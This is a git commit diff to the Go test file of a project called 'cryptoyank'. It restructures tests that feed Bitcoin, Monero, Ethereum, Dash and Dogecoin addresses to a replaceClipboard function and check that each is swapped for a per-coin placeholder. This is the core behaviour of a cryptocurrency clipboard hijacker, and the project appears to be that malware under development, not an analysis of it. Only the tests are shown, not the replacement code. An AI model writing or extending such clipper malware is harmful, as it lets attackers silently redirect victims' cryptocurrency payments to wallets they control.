06d0f6b6bb3012ae9cb9614d90dfa7934a764f83
Jacques Andre <jacquesandre@mailbox.org>
2022-12-04 16:06:13 +0000

    [feautre] updated to allow for multiple address testing

--- cryptoyank/main_test.go
+++ cryptoyank/main_test.go
@@ -6,52 +6,57 @@ import (
 	"github.com/stretchr/testify/assert"
 )
 
+var (
+	XMR_ADDRESSES = []string{"4AdUndXHHZ6cfufTMvppY6JwXNouMBzSkbLYfpAV5Usx3skxNgYeYTRj5UzqtReoS44qo9mtmXCqY45DJ852K5Jv2684Rge"}
+	BTC_ADDRESSES = []string{"bc1qp3f7vnmuj4pjxpfvkvf7yznac9h9r5arlv4fpv"}
+	ETH_ADDRESSES = []string{"0x71C7656EC7ab88b098defB751B7401B5f6d8976F"}
+	DASH_ADDRESSES = []string{"XpESxaUmonkq8RaLLp46Brx2K39ggQe226"}
+	DOGE_ADDRESSES = []string{"DMuFDCTwxdqzfWrCEE7HiMxBonKVU49Fz4"}
+)
+
+
+
 func TestBitcoinMatch(t *testing.T) {
-	var bitcoinExample string = "bc1qp3f7vnmuj4pjxpfvkvf7yznac9h9r5arlv4fpv"
-	var expected string = "new"
-
-	actual, err := replaceClipboard(bitcoinExample)
-
-	assert.Equal(t, actual, expected)
-	assert.Equal(t, err, nil)
+	for _, address := range BTC_ADDRESSES{
+		var expected string = "replace_me_btc"
+		actual, err := replaceClipboard(address)
+		assert.Equal(t, actual, expected)
+		assert.Equal(t, err, nil)
+	}
 }
 
 func TestMoneroMatch(t *testing.T) {
-	var moneroExample string = "4AdUndXHHZ6cfufTMvppY6JwXNouMBzSkbLYfpAV5Usx3skxNgYeYTRj5UzqtReoS44qo9mtmXCqY45DJ852K5Jv2684Rge"
-	var expected string = "new"
-
-	actual, err := replaceClipboard(moneroExample)
-
-	assert.Equal(t, expected, actual)
-	assert.Equal(t, err, nil)
+	for _, address := range XMR_ADDRESSES {
+		var expected string = "replace_me_xmr"
+		actual, err := replaceClipboard(address)
+		assert.Equal(t, actual, expected)
+		assert.Equal(t, err, nil)
+	}
 }
 
 func TestEthereumMatch(t *testing.T) {
-	var ethExample string = "0x71C7656EC7ab88b098defB751B7401B5f6d8976F"
-	var expected string = "new"
-
-	actual, err := replaceClipboard(ethExample)
-
-	assert.Equal(t, actual, expected)
-	assert.Equal(t, err, nil)
+	for _, address := range ETH_ADDRESSES {
+		var expected string = "replace_me_eth"
+		actual, err := replaceClipboard(address)
+		assert.Equal(t, actual, expected)
+		assert.Equal(t, err, nil)
+	}
 }
 
 func TestDashMatch(t *testing.T) {
-	var dashExample string = "XpESxaUmonkq8RaLLp46Brx2K39ggQe226"
-	var expected string = "new"
-
-	actual, err := replaceClipboard(dashExample)
-
-	assert.Equal(t, expected, actual)
-	assert.Equal(t, err, nil)
+	for _, address := range DASH_ADDRESSES {
+		var expected string = "replace_me_dash"
+		actual, err := replaceClipboard(address)
+		assert.Equal(t, actual, expected)
+		assert.Equal(t, err, nil)
+	}
 }
 
 func TestDogeMatch(t *testing.T) {
-	var dogeExample string = "DMuFDCTwxdqzfWrCEE7HiMxBonKVU49Fz4"
-	var expected string = "new"
-
-	actual, err := replaceClipboard(dogeExample)
-
-	assert.Equal(t, expected, actual)
-	assert.Equal(t, err, nil)
+	for _, address := range DOGE_ADDRESSES {
+		var expected string = "replace_me_doge"
+		actual, err := replaceClipboard(address)
+		assert.Equal(t, actual, expected)
+		assert.Equal(t, err, nil)
+	}
 }
